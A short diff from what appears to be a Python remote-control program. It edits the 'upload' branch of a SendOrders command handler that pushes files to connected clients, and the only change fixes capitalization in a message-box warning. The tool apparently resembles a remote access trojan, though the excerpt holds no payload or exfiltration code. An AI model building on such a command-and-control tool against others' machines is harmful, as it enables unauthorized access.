@@ -107,7 +107,7 @@ def SendOrders(Con):
         elif(Command == 'upload'):
         	
         	try:
-        		ctypes.windll.user32.MessageBoxW(0, "If You Send File Requires Admin Rights And The User Did Not See It , This Cause to Suspend Client Until Receive Response From User", "Note", 0)
+        		ctypes.windll.user32.MessageBoxW(0, "If You Send File Requires Admin Rights And The User Did Not See It , This Cause To Suspend Client Until Receive Response From User", "Note", 0)
 
         		try:
         			Up = input(" - File Path -> ")
